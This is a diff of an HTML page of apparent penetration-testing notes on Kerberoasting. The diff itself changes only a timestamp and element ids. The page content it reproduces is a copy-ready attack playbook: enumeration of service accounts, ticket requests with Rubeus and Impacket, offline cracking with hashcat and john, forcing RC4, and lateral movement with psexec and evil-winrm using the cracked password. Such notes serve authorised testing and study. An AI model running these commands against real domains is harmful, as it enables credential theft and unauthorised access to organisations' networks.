@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:15 -->
+<!-- 2026-07-30 Thu 22:25 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Kerberoasting</title>
@@ -938,11 +938,11 @@ passwords set by humans, rarely rotated, and frequently over-privileged.
 <h2 id="orgdca71a5">1. Discovery — Find Kerberoastable Accounts</h2>
 <div class="outline-text-2" id="text-orgdca71a5">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_45528d26dd804715a4f59cfa5e9fd305>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_aa1f6f9ddb3a4e4fa50d5c8ea7da52ed>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_45528d26dd804715a4f59cfa5e9fd305=document.querySelector('button[name=btn_45528d26dd804715a4f59cfa5e9fd305]');
-copyBtnbtn_45528d26dd804715a4f59cfa5e9fd305.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# PowerShell — domain-joined machine\nGet-ADUser -Filter 'ServicePrincipalName -ne \"$null\"' \`\n  -Properties ServicePrincipalName | Select Name, ServicePrincipalName\n\n# PowerView\nImport-Module .\\PowerView.ps1\nGet-DomainUser -SPN | Select samaccountname, serviceprincipalname\n\n# From Linux with valid credentials\nimpacket-GetUserSPNs -dc-ip $DC_IP domain.local/user:password\n`);copyBtnbtn_45528d26dd804715a4f59cfa5e9fd305.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_45528d26dd804715a4f59cfa5e9fd305.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_aa1f6f9ddb3a4e4fa50d5c8ea7da52ed=document.querySelector('button[name=btn_aa1f6f9ddb3a4e4fa50d5c8ea7da52ed]');
+copyBtnbtn_aa1f6f9ddb3a4e4fa50d5c8ea7da52ed.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# PowerShell — domain-joined machine\nGet-ADUser -Filter 'ServicePrincipalName -ne \"$null\"' \`\n  -Properties ServicePrincipalName | Select Name, ServicePrincipalName\n\n# PowerView\nImport-Module .\\PowerView.ps1\nGet-DomainUser -SPN | Select samaccountname, serviceprincipalname\n\n# From Linux with valid credentials\nimpacket-GetUserSPNs -dc-ip $DC_IP domain.local/user:password\n`);copyBtnbtn_aa1f6f9ddb3a4e4fa50d5c8ea7da52ed.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_aa1f6f9ddb3a4e4fa50d5c8ea7da52ed.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -973,11 +973,11 @@ if any have paths to Domain Admin.
 <h3 id="org7ceb362">From Windows</h3>
 <div class="outline-text-3" id="text-org7ceb362">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_dc1d8dc1a6c64e279916e9efaea3e6a9>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_c4c31f84474546078ee6d123ac875a75>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_dc1d8dc1a6c64e279916e9efaea3e6a9=document.querySelector('button[name=btn_dc1d8dc1a6c64e279916e9efaea3e6a9]');
-copyBtnbtn_dc1d8dc1a6c64e279916e9efaea3e6a9.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Rubeus — most reliable, outputs hashes directly\n.\\Rubeus.exe kerberoast /outfile:hashes.txt\n\n# Specific user\n.\\Rubeus.exe kerberoast /user:SQLService /outfile:hashes.txt\n\n# PowerView\nInvoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File hashes.txt -Encoding ascii\n`);copyBtnbtn_dc1d8dc1a6c64e279916e9efaea3e6a9.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_dc1d8dc1a6c64e279916e9efaea3e6a9.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_c4c31f84474546078ee6d123ac875a75=document.querySelector('button[name=btn_c4c31f84474546078ee6d123ac875a75]');
+copyBtnbtn_c4c31f84474546078ee6d123ac875a75.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Rubeus — most reliable, outputs hashes directly\n.\\Rubeus.exe kerberoast /outfile:hashes.txt\n\n# Specific user\n.\\Rubeus.exe kerberoast /user:SQLService /outfile:hashes.txt\n\n# PowerView\nInvoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File hashes.txt -Encoding ascii\n`);copyBtnbtn_c4c31f84474546078ee6d123ac875a75.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c4c31f84474546078ee6d123ac875a75.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -997,11 +997,11 @@ let res = copyTextToClipboard(`# Rubeus — most reliable, outputs hashes direct
 <h3 id="org077821f">From Linux</h3>
 <div class="outline-text-3" id="text-org077821f">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2acbdae039f944ee9510440153dcfdbb>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b2f0eedf61d648ecb18e391f61719f87>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_2acbdae039f944ee9510440153dcfdbb=document.querySelector('button[name=btn_2acbdae039f944ee9510440153dcfdbb]');
-copyBtnbtn_2acbdae039f944ee9510440153dcfdbb.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Impacket — request and extract in one step\nimpacket-GetUserSPNs \\\n  -dc-ip $DC_IP \\\n  -request \\\n  domain.local/user:password \\\n  -outputfile hashes.txt\n\n# With NTLM hash instead of password\nimpacket-GetUserSPNs \\\n  -dc-ip $DC_IP \\\n  -request \\\n  -hashes :NTLM_HASH \\\n  domain.local/user\n`);copyBtnbtn_2acbdae039f944ee9510440153dcfdbb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2acbdae039f944ee9510440153dcfdbb.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_b2f0eedf61d648ecb18e391f61719f87=document.querySelector('button[name=btn_b2f0eedf61d648ecb18e391f61719f87]');
+copyBtnbtn_b2f0eedf61d648ecb18e391f61719f87.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Impacket — request and extract in one step\nimpacket-GetUserSPNs \\\n  -dc-ip $DC_IP \\\n  -request \\\n  domain.local/user:password \\\n  -outputfile hashes.txt\n\n# With NTLM hash instead of password\nimpacket-GetUserSPNs \\\n  -dc-ip $DC_IP \\\n  -request \\\n  -hashes :NTLM_HASH \\\n  domain.local/user\n`);copyBtnbtn_b2f0eedf61d648ecb18e391f61719f87.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b2f0eedf61d648ecb18e391f61719f87.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1024,7 +1024,7 @@ let res = copyTextToClipboard(`# Impacket — request and extract in one step\ni
 <p>
 Hash format (Hashcat mode 13100):
 </p>
-<pre class="example" id="org2b7467d">
+<pre class="example" id="org5358a4b">
 $krb5tgs$23$*SQLService$DOMAIN.LOCAL$domain.local/SQLService*$&lt;hash&gt;
 </pre>
 </div>
@@ -1034,11 +1034,11 @@ $krb5tgs$23$*SQLService$DOMAIN.LOCAL$domain.local/SQLService*$&lt;hash&gt;
 <h2 id="org29d2b7a">3. Offline Cracking</h2>
 <div class="outline-text-2" id="text-org29d2b7a">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_2d520153c8c848a3bc7a754ac91582ee>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_44c36835dfb846359556bb31b818e46e>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_2d520153c8c848a3bc7a754ac91582ee=document.querySelector('button[name=btn_2d520153c8c848a3bc7a754ac91582ee]');
-copyBtnbtn_2d520153c8c848a3bc7a754ac91582ee.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Hashcat — mode 13100 for RC4 (type 23), mode 19600 for AES256\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 19600 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# With rules\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --rules=best64\n\n# John\njohn hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs\n`);copyBtnbtn_2d520153c8c848a3bc7a754ac91582ee.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2d520153c8c848a3bc7a754ac91582ee.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_44c36835dfb846359556bb31b818e46e=document.querySelector('button[name=btn_44c36835dfb846359556bb31b818e46e]');
+copyBtnbtn_44c36835dfb846359556bb31b818e46e.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Hashcat — mode 13100 for RC4 (type 23), mode 19600 for AES256\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 19600 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# With rules\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --rules=best64\n\n# John\njohn hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs\n`);copyBtnbtn_44c36835dfb846359556bb31b818e46e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_44c36835dfb846359556bb31b818e46e.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1065,11 +1065,11 @@ cracks significantly faster than AES256 (type 18):
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_de6f89a1e0f54a91ae28ac21ac36028c>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_37b7a31714474b63b5b979db7169cbe2>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_de6f89a1e0f54a91ae28ac21ac36028c=document.querySelector('button[name=btn_de6f89a1e0f54a91ae28ac21ac36028c]');
-copyBtnbtn_de6f89a1e0f54a91ae28ac21ac36028c.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Rubeus — force RC4\n.\\Rubeus.exe kerberoast /outfile:hashes.txt /tgtdeleg\n\n# Impacket — force RC4\nimpacket-GetUserSPNs -dc-ip $DC_IP domain.local/user:password \\\n  -request -outputfile hashes.txt -no-preauth\n`);copyBtnbtn_de6f89a1e0f54a91ae28ac21ac36028c.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_de6f89a1e0f54a91ae28ac21ac36028c.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_37b7a31714474b63b5b979db7169cbe2=document.querySelector('button[name=btn_37b7a31714474b63b5b979db7169cbe2]');
+copyBtnbtn_37b7a31714474b63b5b979db7169cbe2.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Rubeus — force RC4\n.\\Rubeus.exe kerberoast /outfile:hashes.txt /tgtdeleg\n\n# Impacket — force RC4\nimpacket-GetUserSPNs -dc-ip $DC_IP domain.local/user:password \\\n  -request -outputfile hashes.txt -no-preauth\n`);copyBtnbtn_37b7a31714474b63b5b979db7169cbe2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_37b7a31714474b63b5b979db7169cbe2.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1091,11 +1091,11 @@ With the service account password:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_d85057dc27a9430e82a015fb4e52fd77>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_6c7605bdde22467a974c7a5df0c15046>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_d85057dc27a9430e82a015fb4e52fd77=document.querySelector('button[name=btn_d85057dc27a9430e82a015fb4e52fd77]');
-copyBtnbtn_d85057dc27a9430e82a015fb4e52fd77.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Authenticate as the service account\nimpacket-psexec domain.local/SQLService:password@$TARGET\n\n# If service account is local admin on machines — lateral movement\nevil-winrm -i $TARGET -u SQLService -p password\n\n# Check BloodHound — does this account have a path to DA?\n# If GenericAll / WriteDACL / AdminTo anywhere interesting\n`);copyBtnbtn_d85057dc27a9430e82a015fb4e52fd77.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d85057dc27a9430e82a015fb4e52fd77.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_6c7605bdde22467a974c7a5df0c15046=document.querySelector('button[name=btn_6c7605bdde22467a974c7a5df0c15046]');
+copyBtnbtn_6c7605bdde22467a974c7a5df0c15046.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Authenticate as the service account\nimpacket-psexec domain.local/SQLService:password@$TARGET\n\n# If service account is local admin on machines — lateral movement\nevil-winrm -i $TARGET -u SQLService -p password\n\n# Check BloodHound — does this account have a path to DA?\n# If GenericAll / WriteDACL / AdminTo anywhere interesting\n`);copyBtnbtn_6c7605bdde22467a974c7a5df0c15046.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_6c7605bdde22467a974c7a5df0c15046.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
